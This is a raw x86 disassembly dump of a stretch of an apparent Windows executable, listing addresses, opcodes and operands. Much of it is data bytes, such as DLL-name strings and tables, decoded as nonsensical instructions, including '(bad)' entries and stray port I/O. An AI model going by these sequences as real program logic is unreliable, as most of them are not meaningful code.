  41e92b:	ins    DWORD PTR es:[edi],dx
  41e92c:	inc    esp
  41e92d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41e934:	jns    0x41e936
  41e936:	push   ebp
  41e937:	push   ebx
  41e938:	inc    ebp
  41e939:	push   edx
  41e93a:	xor    esi,DWORD PTR [edx]
  41e93c:	cs fs ins BYTE PTR es:[edi],dx
  41e93f:	ins    BYTE PTR es:[edi],dx
  41e940:	add    BYTE PTR [eax],al
  41e942:	push   ebx
  41e943:	dec    eax
  41e944:	inc    ebp
  41e945:	dec    esp
  41e946:	dec    esp
  41e947:	xor    esi,DWORD PTR [edx]
  41e949:	cs fs ins BYTE PTR es:[edi],dx
  41e94c:	ins    BYTE PTR es:[edi],dx
  41e94d:	add    BYTE PTR [ebx+0x70],dh
  41e950:	push   ecx
  41e951:	dec    edx
  41e952:	push   0x47
  41e954:	jne    0x41e99c
  41e956:	jns    0x41e99f
  41e958:	push   edi
  41e959:	push   esi
  41e95a:	inc    edi
  41e95b:	ins    BYTE PTR es:[edi],dx
  41e95c:	inc    ecx
  41e95d:	inc    edi
  41e95e:	push   ds
  41e95f:	in     eax,dx
  41e960:	inc    ecx
  41e961:	add    BYTE PTR [esi],ah
  41e963:	in     eax,dx
  41e964:	inc    ecx
  41e965:	add    BYTE PTR [esi-0x10ffbe15],ah
  41e96b:	or     esi,DWORD PTR [edx+0x324f7d0e]
  41e971:	dec    edi
  41e972:	addr16 dec edi
  41e974:	xor    DWORD PTR [edi+0x4f],ecx
  41e977:	dec    edi
  41e978:	cmp    al,0x4f
  41e97a:	jp     0x41e9cb
  41e97c:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e97f:	dec    edi
  41e980:	es dec edi
  41e982:	jae    0x41e9d3
  41e984:	and    eax,0x224f324f
  41e989:	dec    edi
  41e98a:	push   ds
  41e98b:	push   edx
  41e98c:	pop    ds
  41e98d:	push   ebx
  41e98e:	cmp    eax,0x324f7d4f
  41e993:	dec    edi
  41e994:	addr16 dec edi
  41e996:	xor    DWORD PTR [edi+0x4f],ecx
  41e999:	dec    edi
  41e99a:	cmp    al,0x4f
  41e99c:	jp     0x41e9ed
  41e99e:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e9a1:	dec    edi
  41e9a2:	es dec edi
  41e9a4:	ins    DWORD PTR es:[edi],dx
  41e9a5:	dec    edi
  41e9a6:	and    eax,0x224f324f
  41e9ab:	dec    edi
  41e9ac:	push   ds
  41e9ad:	bound  ebx,QWORD PTR [edi]
  41e9af:	arpl   WORD PTR ds:0x324f7d4f,di
  41e9b5:	dec    edi
  41e9b6:	bound  ecx,QWORD PTR [edi+0x31]
  41e9b9:	dec    edi
  41e9ba:	jae    0x41ea0b
  41e9bc:	cmp    eax,0x384f404f
  41e9c1:	dec    edi
  41e9c2:	xor    cl,BYTE PTR [edi+0x24]
  41e9c5:	dec    edi
  41e9c6:	push   ds
  41e9c7:	jb     0x41e9e8
  41e9c9:	jae    0x41e9da
  41e9cb:	or     DWORD PTR [eax+eax*4],0x7c
  41e9cf:	nop
  41e9d0:	jge    0x41e963
  41e9d2:	aas    
  41e9d3:	dec    edi
  41e9d4:	dec    di
  41e9d6:	xor    cl,BYTE PTR [edi+0x66]
  41e9d9:	dec    edi
  41e9da:	ds dec edi
  41e9dc:	inc    eax
  41e9dd:	dec    edi
  41e9de:	cmp    eax,0x394f734f
  41e9e3:	dec    edi
  41e9e4:	xor    cl,BYTE PTR [edi+0x26]
  41e9e7:	dec    edi
  41e9e8:	push   ds
  41e9e9:	sbb    BYTE PTR [edi],0x83
  41e9ec:	setae  BYTE PTR [eax+edx*4]
  41e9f0:	jl     0x41e992
  41e9f2:	jge    0x41e995
  41e9f4:	aas    
  41e9f5:	dec    edi
  41e9f6:	dec    di
  41e9f8:	xor    cl,BYTE PTR [edi+0x66]
  41e9fb:	dec    edi
  41e9fc:	ds dec edi
  41e9fe:	inc    eax
  41e9ff:	dec    edi
  41ea00:	cmp    eax,0x394f6d4f
  41ea05:	dec    edi
  41ea06:	xor    cl,BYTE PTR [edi+0x26]
  41ea09:	dec    edi
  41ea0a:	push   ds
  41ea0b:	xchg   edx,eax
  41ea0c:	pop    ds
  41ea0d:	xchg   ebx,eax
  41ea0e:	bt     DWORD PTR [eax+eiz*4],ecx
  41ea12:	jl     0x41e9c4
  41ea14:	jge    0x41e9c7
  41ea16:	aas    
  41ea17:	dec    edi
  41ea18:	ins    BYTE PTR es:[edi],dx
  41ea19:	dec    edi
  41ea1a:	xor    cl,BYTE PTR [edi+0x4e]
  41ea1d:	dec    edi
  41ea1e:	xor    DWORD PTR [edi+0x73],ecx
  41ea21:	dec    edi
  41ea22:	cmp    eax,0x384f454f
  41ea27:	dec    edi
  41ea28:	xor    cl,BYTE PTR [edi+0x26]
  41ea2b:	dec    edi
  41ea2c:	push   ds
  41ea2d:	mov    ds:0xb30fa31f,al
  41ea32:	or     al,0xb0
  41ea34:	jl     0x41e9f6
  41ea36:	jge    0x41e9f9
  41ea38:	aas    
  41ea39:	dec    edi
  41ea3a:	ins    BYTE PTR es:[edi],dx
  41ea3b:	dec    edi
  41ea3c:	xor    cl,BYTE PTR [edi+0x4e]
  41ea3f:	dec    edi
  41ea40:	xor    DWORD PTR [edi+0x7c],ecx
  41ea43:	dec    edi
  41ea44:	cmp    eax,0x3b4f5f4f
  41ea49:	dec    edi
  41ea4a:	xor    cl,BYTE PTR [edi+0x39]
  41ea4d:	dec    edi
  41ea4e:	push   ds
  41ea4f:	mov    dl,0x1f
  41ea51:	mov    bl,0xf
  41ea53:	ret    
  41ea54:	or     al,0xc0
  41ea56:	jl     0x41ea28
  41ea58:	jge    0x41ea2b
  41ea5a:	aas    
  41ea5b:	dec    edi
  41ea5c:	ins    BYTE PTR es:[edi],dx
  41ea5d:	dec    edi
  41ea5e:	xor    cl,BYTE PTR [edi+0x4e]
  41ea61:	dec    edi
  41ea62:	xor    DWORD PTR [edi+0x62],ecx
  41ea65:	dec    edi
  41ea66:	cmp    eax,0x384f4e4f
  41ea6b:	dec    edi
  41ea6c:	xor    cl,BYTE PTR [edi+0x24]
  41ea6f:	dec    edi
  41ea70:	push   ds
  41ea71:	ret    0xc31f
  41ea74:	psrlq  mm1,QWORD PTR [eax+edx*8]
  41ea78:	jl     0x41ea5a
  41ea7a:	jge    0x41ea5d
  41ea7c:	aas    
  41ea7d:	dec    edi
  41ea7e:	ins    BYTE PTR es:[edi],dx
  41ea7f:	dec    edi
  41ea80:	xor    cl,BYTE PTR [edi+0x4e]
  41ea83:	dec    edi
  41ea84:	xor    DWORD PTR [edi+0x63],ecx
  41ea87:	dec    edi
  41ea88:	cmp    eax,0x384f404f
  41ea8d:	dec    edi
  41ea8e:	xor    cl,BYTE PTR [edi+0x26]
  41ea91:	dec    edi
  41ea92:	push   ds
  41ea93:	rcr    BYTE PTR [edi],cl
  41ea95:	ror    DWORD PTR [edi],cl
  41ea97:	jecxz  0x41eaa5
  41ea99:	loopne 0x41eb17
  41ea9b:	lock jge 0x41ea8f
  41ea9e:	aas    
  41ea9f:	dec    edi
  41eaa0:	popa   
  41eaa1:	dec    edi
  41eaa2:	xor    cl,BYTE PTR [edi+0x5f]
  41eaa5:	dec    edi
  41eaa6:	xor    DWORD PTR [edi+0x42],ecx
  41eaa9:	dec    edi
  41eaaa:	ds dec edi
  41eaac:	xor    cl,BYTE PTR [edi+0x3f]
  41eaaf:	dec    edi
  41eab0:	push   ds
  41eab1:	loop   0x41ead2
  41eab3:	jecxz  0x41eac4
  41eab5:	repz or al,0xf0
  41eab8:	jl     0x41eaba
  41eaba:	jge    0x41eabd
  41eabc:	jl     0x41eace
  41eabe:	jge    0x41ead1
  41eac0:	ds dec edi
  41eac2:	jg     0x41eb13
  41eac4:	xor    cl,BYTE PTR [edi+0x5b]
  41eac7:	dec    edi
  41eac8:	xor    BYTE PTR [edi+0x62],cl
  41eacb:	dec    edi
  41eacc:	ds dec edi
  41eace:	inc    ecx
  41eacf:	dec    edi
  41ead0:	cmp    ecx,DWORD PTR [edi+0x32]
  41ead3:	dec    edi
  41ead4:	cmp    DWORD PTR [edi+0x1e],ecx
  41ead7:	add    bl,BYTE PTR [edi]
  41ead9:	add    ecx,DWORD PTR [edi]
  41eadb:	adc    ecx,DWORD PTR [eax+edx*1]
  41eade:	jl     0x41eb00
  41eae0:	jge    0x41eb03
  41eae2:	aas    
  41eae3:	dec    edi
  41eae4:	add    BYTE PTR [eax],al
  41eae6:	outs   dx,BYTE PTR ds:[esi]
  41eae7:	jmp    0xeba3eb2d
  41eaec:	inc    ecx
  41eaed:	add    BYTE PTR [edx-0x15],ch
  41eaf0:	inc    ecx
  41eaf1:	add    BYTE PTR [edx],ch
  41eaf3:	in     eax,dx
  41eaf4:	inc    ecx
  41eaf5:	add    BYTE PTR [esi+0x1a0041ec],cl
  41eafb:	in     eax,dx
  41eafc:	inc    ecx
  41eafd:	add    BYTE PTR [edx-0x15],cl
  41eb00:	inc    ecx
  41eb01:	add    BYTE PTR [esi-0x15],cl
  41eb04:	inc    ecx
  41eb05:	add    BYTE PTR [edx],dl
  41eb07:	in     eax,dx
  41eb08:	inc    ecx
  41eb09:	add    BYTE PTR [edx-0x4effbe15],dh
  41eb0f:	test   eax,0xbab8f89c
  41eb14:	pushf  
  41eb15:	clc    
  41eb16:	data16 jmp 0x41eb5a
  41eb19:	add    BYTE PTR [edx-0x14],cl
  41eb1c:	inc    ecx
  41eb1d:	add    BYTE PTR [esi-0x14],bl
  41eb20:	inc    ecx
  41eb21:	add    BYTE PTR [edx-0x14],ch
  41eb24:	inc    ecx
  41eb25:	add    BYTE PTR [edx-0x14],bh
  41eb28:	inc    ecx
  41eb29:	add    BYTE PTR [esi+0x6a0041eb],bl
  41eb2f:	jmp    0xebffeb75
  41eb34:	inc    ecx
  41eb35:	add    BYTE PTR [esi+0x2e0041eb],ch
  41eb3b:	in     eax,dx
  41eb3c:	inc    ecx
  41eb3d:	add    BYTE PTR [eax],bh
  41eb3f:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  41eb46:	jb     0x41eb33
  41eb48:	inc    ecx
  41eb49:	add    BYTE PTR [edx-0x717ee9e4],bl
  41eb4f:	or     eax,0x705
  41eb54:	inc    eax
  41eb55:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  41eb59:	fst    QWORD PTR [ebp-0x59]
  41eb5c:	inc    edx
  41eb5d:	add    BYTE PTR [edx+0x68],dh
  41eb60:	inc    ebp
  41eb61:	inc    ecx
  41eb62:	mov    ?,edx
  41eb64:	jne    0x41ebc8
  41eb66:	mov    gs,ebp
  41eb68:	inc    BYTE PTR [edi]
  41eb6a:	mov    edi,0x5a05a3fa
  41eb6f:	jmp    0x41ebb2
  41eb71:	add    BYTE PTR [ecx],bh
  41eb73:	xchg   ebp,eax
  41eb74:	pushf  
  41eb75:	clc    
  41eb76:	cmp    DWORD PTR [esi-0x6ac50764],edx
  41eb7c:	pushf  
  41eb7d:	clc    
  41eb7e:	cmp    edx,DWORD PTR [ebp-0x6ac30764]
  41eb84:	pushf  
  41eb85:	clc    
  41eb86:	cmp    eax,0x3ef89c95
  41eb8b:	xchg   ebp,eax
  41eb8c:	pushf  
  41eb8d:	clc    
  41eb8e:	aas    
  41eb8f:	xchg   ebp,eax
  41eb90:	pushf  
  41eb91:	clc    
  41eb92:	and    BYTE PTR [ebp-0x6ade0764],dl
  41eb98:	pushf  
  41eb99:	clc    
  41eb9a:	sub    BYTE PTR [ebp-0x6130764],dl
  41eba0:	add    esp,DWORD PTR [eax+0x62]
  41eba3:	jmp    0x726bebe9
  41eba8:	inc    edx
  41eba9:	add    BYTE PTR [ecx+0x49],bl
  41ebac:	imul   di,WORD PTR [eax],0xff85
  41ebb0:	pushf  
  41ebb1:	clc    
  41ebb2:	popf   
  41ebb3:	jmp    0xb54f308
  41ebb8:	add    BYTE PTR [eax],al
  41ebba:	pop    esi
  41ebbb:	jmp    0xbdcec01
  41ebc0:	add    al,0xe
	...
  41ebf2:	add    BYTE PTR [eax],dl
  41ebf4:	inc    eax
  41ebf5:	add    BYTE PTR [esi-0x7e],cl
  41ebf8:	inc    edx
  41ebf9:	add    BYTE PTR [eax],al
  41ebfb:	add    BYTE PTR [eax],al
  41ebfd:	add    BYTE PTR [ecx+0x0],cl
  41ec00:	inc    esp
  41ec01:	add    BYTE PTR [ecx+0x0],ch
  41ec04:	add    BYTE PTR fs:[ebx+0x0],cl
  41ec08:	dec    edx
  41ec09:	add    BYTE PTR [ebx+0x0],cl
  41ec0c:	dec    edx
  41ec0d:	add    BYTE PTR [eax+eax*1+0x6b],al
  41ec11:	add    BYTE PTR [eax+eax*1+0x6a],ch
  41ec15:	add    BYTE PTR [eax+eax*1+0x4c],al
  41ec19:	add    BYTE PTR [ecx+0x0],cl
  41ec1c:	inc    esp
  41ec1d:	add    BYTE PTR [eax+eax*1+0x49],cl
  41ec21:	add    BYTE PTR [ebp+0x0],dl
  41ec24:	dec    edx
  41ec25:	add    BYTE PTR [ebx+0x0],cl
  41ec28:	inc    esp
  41ec29:	add    BYTE PTR [eax+eax*1+0x4a],cl
  41ec2d:	add    BYTE PTR [ebx+0x0],cl
  41ec30:	dec    eax
  41ec31:	add    BYTE PTR [eax+eax*1+0x4a],al
  41ec35:	add    BYTE PTR [eax],al
  41ec37:	add    BYTE PTR [eax],al
  41ec39:	add    dh,bh
  41ec3b:	jmp    0x41ec7e
	...
  41ec45:	add    BYTE PTR [eax+0x59004191],bl
  41ec4b:	dec    edi
  41ec4c:	pop    edi
  41ec4d:	dec    edi
  41ec4e:	inc    eax
  41ec4f:	dec    edi
  41ec50:	inc    esp
  41ec51:	dec    edi
  41ec52:	pop    edi
  41ec53:	dec    edi
  41ec54:	inc    esi
  41ec55:	dec    edi
  41ec56:	add    DWORD PTR [edi+0x0],ecx
  41ec59:	dec    edi
  41ec5a:	xor    cl,BYTE PTR [edi+0x0]
  41ec5d:	add    BYTE PTR [ebp+0x4f],bl
  41ec60:	pop    esi
  41ec61:	dec    edi
  41ec62:	pop    ebx
  41ec63:	dec    edi
  41ec64:	add    DWORD PTR [edi+0x0],ecx
  41ec67:	dec    edi
  41ec68:	xor    cl,BYTE PTR [edi+0x4f]
  41ec6b:	dec    edi
  41ec6c:	inc    ecx
  41ec6d:	dec    edi
  41ec6e:	pop    edi
  41ec6f:	dec    edi
  41ec70:	inc    eax
  41ec71:	dec    edi
  41ec72:	add    DWORD PTR [edi+0x0],ecx
  41ec75:	dec    edi
  41ec76:	xor    cl,BYTE PTR [edi+0x0]
  41ec79:	add    BYTE PTR [ecx+0x4f],al
  41ec7c:	pop    edx
  41ec7d:	dec    edi
  41ec7e:	inc    esi
  41ec7f:	dec    edi
  41ec80:	dec    ebp
  41ec81:	dec    edi
  41ec82:	push   ebx
  41ec83:	dec    edi
  41ec84:	inc    edx
  41ec85:	dec    edi
  41ec86:	pop    ebx
  41ec87:	dec    edi
  41ec88:	xor    cl,BYTE PTR [edi+0x0]
  41ec8b:	add    BYTE PTR [eax],al
  41ec8d:	add    BYTE PTR [esi+0x7d],ch
  41ec90:	outs   dx,BYTE PTR ds:[esi]
  41ec91:	lea    ebp,[esi-0x63]
  41ec94:	outs   dx,BYTE PTR ds:[esi]
  41ec95:	lods   eax,DWORD PTR ds:[esi]
  41ec96:	outs   dx,BYTE PTR ds:[esi]
  41ec97:	mov    ebp,0xdd6ecd6e
  41ec9c:	outs   dx,BYTE PTR ds:[esi]
  41ec9d:	in     eax,dx
  41ec9e:	outs   dx,BYTE PTR ds:[esi]
  41ec9f:	std    
  41eca0:	outs   dx,BYTE PTR ds:[esi]
  41eca1:	or     eax,0x2d6e1d6e
  41eca6:	outs   dx,BYTE PTR ds:[esi]
  41eca7:	cmp    eax,0x6d6e5d6e
  41ecac:	outs   dx,BYTE PTR ds:[esi]
  41ecad:	jb     0x41ed1d
  41ecaf:	jae    0x41ed1f
  41ecb1:	jo     0x41ed21
  41ecb3:	jno    0x41ed23
  41ecb5:	jbe    0x41ed25
  41ecb7:	ja     0x41ed27
  41ecb9:	je     0x41ed29
  41ecbb:	jne    0x41ed2b
  41ecbd:	mov    ch,BYTE PTR [esi-0x75]
  41ecc0:	outs   dx,BYTE PTR ds:[esi]
  41ecc1:	mov    BYTE PTR [esi-0x77],ch
  41ecc4:	outs   dx,BYTE PTR ds:[esi]
  41ecc5:	mov    gs,WORD PTR [esi+0x7c]
  41ecc8:	pop    esi
  41ecc9:	jge    0x41ed19
  41eccb:	jge    0x41ec8b
  41eccd:	jge    0x41ed2b
  41eccf:	(bad)  
  41ecd0:	jge    0x41ed42
  41ecd2:	mov    ebp,0x71736eb1
  41ecd7:	bound  ebp,QWORD PTR [edx+0x70265fc6]
  41ecdd:	add    BYTE PTR [ebp+0x17],cl
  41ece0:	mov    ebx,0x4af4bd56
  41ece5:	aaa    
  41ece6:	dec    edx
  41ece7:	jle    0x41ec86
  41ece9:	jno    0x41ed3f
  41eceb:	mov    cl,0x8
  41eced:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d8],0x48
  41ecf5:	xlat   BYTE PTR ds:[ebx]
  41ecf6:	lds    edx,FWORD PTR [ebx+0x7dc4114c]
  41ecfc:	ret    
  41ecfd:	fidiv  WORD PTR [edi]
  41ecff:	into   
  41ed00:	mul    BYTE PTR [esi+0x1faa3204]
  41ed06:	push   0xc5c644f1
  41ed0b:	sbb    ch,al
  41ed0d:	jno    0x41ed0f
  41ed0f:	add    BYTE PTR [eax],al
  41ed11:	add    dh,ch
  41ed13:	(bad)  [ebx+0x7]
  41ed16:	mov    edx,0x450041eb
  41ed1b:	das    
  41ed1c:	shl    BYTE PTR [edx],0xb4
  41ed1f:	rol    BYTE PTR [ecx+0x0],1
  41ed22:	inc    esi
  41ed23:	push   ebx
  41ed24:	outs   dx,DWORD PTR ds:[esi]
  41ed25:	push   ebx
  41ed26:	push   edx
  41ed27:	jmp    0x41ed6a
  41ed29:	add    BYTE PTR [esi-0x71ffbe15],dh
  41ed2f:	in     eax,dx
  41ed30:	adc    al,BYTE PTR [edi]
  41ed32:	jae    0x41ed9d
  41ed34:	inc    edx
  41ed35:	jae    0x41ed9c
  41ed37:	popa   
  41ed38:	push   ecx
  41ed39:	pop    eax
  41ed3a:	pop    ecx
  41ed3b:	outs   dx,BYTE PTR ds:[esi]
  41ed3c:	jbe    0x41edb6
  41ed3e:	jns    0x41ed94
  41ed40:	push   ecx
  41ed41:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  41ed45:	je     0x41edb6
  41ed47:	jns    0x41edb7
  41ed49:	popa   
  41ed4a:	push   esi
  41ed4b:	push   ebp
  41ed4c:	push   0x57564476
  41ed51:	dec    edx
  41ed52:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  41ed59:	popa   
	...
  41ed6e:	jp     0x41edc4
  41ed70:	arpl   WORD PTR [ecx+0x4b],cx
  41ed73:	push   edx
  41ed74:	imul   ebp,DWORD PTR [eax+0x45],0x55487459
  41ed7b:	jp     0x41ede9
  41ed7d:	jb     0x41edd2
  41ed7f:	outs   dx,DWORD PTR ds:[esi]
  41ed80:	push   ebx
  41ed81:	inc    esi
  41ed82:	inc    edi
  41ed83:	push   0x66495949
  41ed88:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  41ed8c:	push   esi
  41ed8d:	jb     0x41edf7
  41ed8f:	add    BYTE PTR [ecx+0x43],ah
  41ed92:	push   ecx
  41ed93:	ins    BYTE PTR es:[edi],dx
  41ed94:	pop    eax
  41ed95:	ja     0x41ede4
  41ed97:	je     0x41ee0f
  41ed99:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  41ed9d:	add    BYTE PTR [edi+0x56],dl
  41eda0:	push   esp
  41eda1:	dec    eax
  41eda2:	je     0x41edf0
  41eda4:	push   ebx
  41eda5:	jne    0x41ee12
  41eda7:	popa   
  41eda8:	jns    0x41edaa
  41edaa:	dec    edi
  41edab:	push   esp
  41edac:	dec    edi
  41edad:	dec    ebx
  41edae:	pop    edi
  41edaf:	pop    ebx
  41edb0:	dec    edi
  41edb1:	push   esp
  41edb2:	add    bl,BYTE PTR [esi]
  41edb4:	adc    ch,BYTE PTR ds:0xb0666f4a
  41edba:	push   eax
  41edbb:	jge    0x41edbe
  41edbd:	add    BYTE PTR [eax-0x63fffffa],al
  41edc3:	cwde   
  41edc4:	dec    edi
  41edc5:	das    
  41edc6:	leave  
  41edc7:	and    dl,bh
  41edc9:	fcmovbe st,st(1)
  41edcb:	hlt    
  41edcc:	cli    
  41edcd:	cs pop edx
  41edcf:	cmc    
  41edd0:	fist   WORD PTR [eax+0x7b]
  41edd3:	push   ebp
  41edd4:	cdq    
  41edd5:	sbb    bh,0x42
  41edd8:	lea    edx,[eax+edx*4+0x29]
  41eddc:	sub    DWORD PTR [ebx],esi
  41edde:	hlt    
  41eddf:	addr16 out 0xe2,al
  41ede2:	mov    esi,0xf819f485
  41ede7:	lea    edx,[ecx]
  41ede9:	sub    bl,BYTE PTR [ebp+0x2d]
  41edec:	and    DWORD PTR [esp+ebx*4+0x37bfc4e9],esp
  41edf3:	rcl    BYTE PTR [eax+0x4a],cl
  41edf6:	addr16 push edi
  41edf8:	sbb    BYTE PTR [ebp+ebp*2+0x511634d5],dl
  41edff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee00:	bound  eax,QWORD PTR [edx]
  41ee02:	test   DWORD PTR [ebp+ecx*4-0x6f22ac06],ecx
  41ee09:	xchg   edx,eax
  41ee0a:	adc    DWORD PTR [eax-0x34ddf6c9],esi
  41ee10:	sub    al,0x3f
  41ee12:	xchg   edi,eax
  41ee13:	jge    0x41ede0
  41ee15:	push   esi
  41ee16:	sbb    DWORD PTR [eax],ebx
  41ee18:	mov    esi,0xa0d939c4
  41ee1d:	in     al,0x4e
  41ee1f:	aam    0x56
  41ee21:	mov    edi,0xe7fff2f8
  41ee26:	jb     0x41edc5
  41ee28:	shr    dl,0x15
  41ee2b:	daa    
  41ee2c:	add    esi,DWORD PTR [ecx+eiz*8-0xc97bcf6]
  41ee33:	repz add eax,0xc48c6c41
  41ee39:	(bad)  
  41ee3b:	mov    ah,0xb1
  41ee3d:	pop    edx
  41ee3e:	mov    al,ds:0xc37b6dd1
  41ee43:	and    al,0x50
  41ee45:	adc    al,0x71
  41ee47:	sub    DWORD PTR [ebx+0x642d117d],ecx
  41ee4d:	jns    0x41eddd
  41ee4f:	std    
  41ee50:	iret   
  41ee51:	jns    0x41ee0a
  41ee53:	icebp  
  41ee54:	(bad)  
  41ee55:	xchg   esi,eax
  41ee56:	mov    ecx,0xc2abf402
  41ee5b:	jno    0x41ee46
  41ee5d:	inc    ecx
  41ee5e:	push   eax
  41ee5f:	test   al,0x46
  41ee61:	cmp    ebx,DWORD PTR [eax+0x4cb226e3]
  41ee67:	sub    al,0xde
  41ee69:	mov    al,0xda
  41ee6b:	or     ch,BYTE PTR [ebp-0x7f801c7e]
  41ee71:	adc    eax,DWORD PTR [edx+0x2d]
  41ee74:	retf   
  41ee75:	clc    
  41ee76:	arpl   WORD PTR [ebp-0x2d1033ec],sp
  41ee7c:	push   0xfffffff4
  41ee7e:	std    
  41ee7f:	jge    0x41ee6f
  41ee81:	inc    ebp
  41ee82:	mov    bh,0xc1
  41ee84:	mov    ss:0xcda82b8b,al
  41ee8a:	ja     0x41ee87
  41ee8c:	adc    ch,BYTE PTR [edx]
  41ee8e:	sbb    DWORD PTR [ebx-0x672111c9],0xffffffaa
  41ee95:	in     al,dx
  41ee96:	xchg   BYTE PTR [edi+0x27585a72],dh
  41ee9c:	std    
  41ee9d:	ret    
  41ee9e:	int    0x80
  41eea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eea1:	xor    al,0xab
  41eea3:	cmc    
  41eea4:	repz jbe 0x41eeb4
  41eea7:	sbb    BYTE PTR [ecx+0x1],ch
  41eeaa:	je     0x41eec9
  41eeac:	gs or  cl,dl
  41eeaf:	mov    al,0x27
  41eeb1:	js     0x41ef14
  41eeb3:	test   BYTE PTR [eax-0x24],bl
  41eeb6:	mov    cl,0xc1
  41eeb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eeb9:	inc    edx
  41eeba:	add    BYTE PTR [edi+0x27a08cf],ah
  41eec0:	lods   al,BYTE PTR ds:[esi]
  41eec1:	pushf  
  41eec2:	pop    ss
  41eec3:	call   0x32c2:0x83aa23d6
  41eeca:	pop    ss
  41eecb:	fs lock sbb eax,0xa91261b8
  41eed2:	sub    BYTE PTR [ebp+eax*4-0x6e],0x90
  41eed7:	aas    
  41eed8:	lods   eax,DWORD PTR ds:[esi]
  41eed9:	jge    0x41ee9b
  41eedb:	mov    ebx,0x20cb1cab
  41eee0:	imul   edi,esp,0xffffff96
  41eee3:	jp     0x41ef1c
  41eee5:	fsubr  st,st(0)
  41eee7:	outs   dx,DWORD PTR ds:[esi]
  41eee8:	bnd ret 0xc9c4
  41eeec:	push   ebp
  41eeed:	dec    ecx
  41eeee:	lea    eax,[ebx+0x78c68070]
  41eef4:	and    al,0xd7
  41eef6:	dec    ebx
  41eef7:	adc    eax,DWORD PTR es:[edx+ecx*1+0x2e2eb0ae]
  41eeff:	jg     0x41ee94
  41ef01:	jl     0x41ef70
  41ef03:	jbe    0x41ef03
  41ef05:	nop
  41ef06:	pushf  
  41ef07:	add    al,0x10
  41ef09:	sbb    ch,dh
  41ef0b:	cmp    cl,0x43
  41ef0e:	fxch   st(4)
  41ef10:	jecxz  0x41ef90
  41ef12:	xlat   BYTE PTR ds:[ebx]
  41ef13:	xchg   esp,eax
  41ef14:	sub    DWORD PTR [edi],eax
  41ef16:	mov    ds:0x9afd7b60,al
  41ef1b:	cmp    eax,0x9e3894d1
  41ef20:	or     esi,ebx
  41ef22:	shl    BYTE PTR [edx-0x4beb2ab0],cl
  41ef28:	sbb    eax,0xd406b0e9
  41ef2d:	ds xor al,0x19
  41ef30:	sbb    dl,dh
  41ef32:	fstp   st(2)
  41ef34:	rcr    eax,0x12
  41ef37:	dec    eax
  41ef38:	sbb    esp,ebp
  41ef3a:	or     DWORD PTR [esi],edi
  41ef3c:	push   cs
  41ef3d:	stos   BYTE PTR es:[edi],al
  41ef3e:	xchg   ebp,eax
  41ef3f:	cmc    
  41ef40:	dec    eax
  41ef41:	adc    ecx,DWORD PTR [ebx-0x16]
  41ef44:	shl    ah,0xd7
  41ef47:	cmp    BYTE PTR [ecx],dl
  41ef49:	test   DWORD PTR [esi+0x7b],ebx
  41ef4c:	sub    eax,0x2849119f
  41ef51:	cwde   
  41ef52:	adc    eax,0xea64b7dd
  41ef57:	mov    cl,0x4f
  41ef59:	xor    DWORD PTR [ebp-0x5a363b62],ebp
  41ef5f:	lods   eax,DWORD PTR ds:[esi]
  41ef60:	mov    ch,0xdb
  41ef62:	lds    eax,FWORD PTR [ebx]
  41ef64:	ss repz adc eax,0x69ce4554
  41ef6b:	xor    ah,BYTE PTR [ebx-0x29]
  41ef6e:	mov    ecx,0x342cc387
  41ef73:	cmp    DWORD PTR [esi],esp
  41ef75:	dec    ecx
  41ef76:	aam    0x2
  41ef78:	in     eax,0x3c
  41ef7a:	test   BYTE PTR [ebp-0x4d],0xb8
  41ef7e:	cmp    BYTE PTR [di-0x7d],dl
  41ef82:	cmc    
  41ef83:	push   edi
  41ef84:	xor    bl,BYTE PTR ds:[eax+0x5ce30954]
  41ef8b:	dec    esp
  41ef8c:	loop   0x41ef40
  41ef8e:	int3   
  41ef8f:	or     DWORD PTR [ebp+0x2294d8d0],edi
  41ef95:	jg     0x41efdd
  41ef97:	(bad)  
  41ef98:	test   al,0x4
  41ef9a:	cmp    al,0x47
  41ef9c:	shr    ebx,0xa9
  41ef9f:	cmp    ecx,DWORD PTR [edx+0x3]
  41efa2:	test   edx,ecx
  41efa4:	cld    
  41efa5:	aam    0xc7
  41efa7:	jnp    0x41ef60
  41efa9:	mov    BYTE PTR [ebx],dl
  41efab:	popf   
  41efac:	pop    ebx
  41efad:	inc    ebp
  41efae:	lods   al,BYTE PTR ds:[esi]
  41efaf:	aad    0x3c
  41efb1:	repz imul ebx,esp,0xffffffd4
  41efb5:	out    dx,eax
  41efb6:	fs mov ebp,0x499ce123
  41efbc:	jo     0x41ef59
  41efbe:	aad    0xce
  41efc0:	ins    DWORD PTR es:[edi],dx
  41efc1:	mov    esp,0x48065bc0
  41efc6:	inc    ebp
  41efc7:	sahf   
  41efc8:	call   0x18ff:0xa344eb64
  41efcf:	dec    ecx
  41efd0:	aam    0xc0
  41efd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efd3:	int    0x29
  41efd5:	inc    edi
  41efd6:	pushf  
  41efd7:	push   esp
  41efd8:	(bad)  
  41efd9:	stos   DWORD PTR es:[edi],eax
  41efda:	scas   al,BYTE PTR es:[edi]
  41efdb:	mov    dh,0x9b
  41efdd:	out    dx,eax
  41efde:	jb     0x41ef7c
  41efe0:	dec    eax
  41efe1:	inc    edx
  41efe2:	fldcw  WORD PTR [edi-0x6031fffc]
  41efe8:	int    0x54
  41efea:	ret    0x523b
  41efed:	cwde   
  41efee:	pop    esi
  41efef:	imul   esi,esi,0x9ec3d13f
  41eff5:	bound  ecx,QWORD PTR [ebp-0x47]
  41eff8:	inc    edx
  41eff9:	inc    edx
  41effa:	int3   
  41effb:	rol    ecx,0xe4
  41effe:	or     dh,BYTE PTR [ebx]
  41f000:	ins    BYTE PTR es:[edi],dx
  41f001:	(bad)  [ebx+0xc]
  41f004:	xchg   esi,eax
  41f005:	loope  0x41f030
  41f007:	addr16 add eax,0xbb830bed
  41f00d:	rcl    BYTE PTR [esi],1
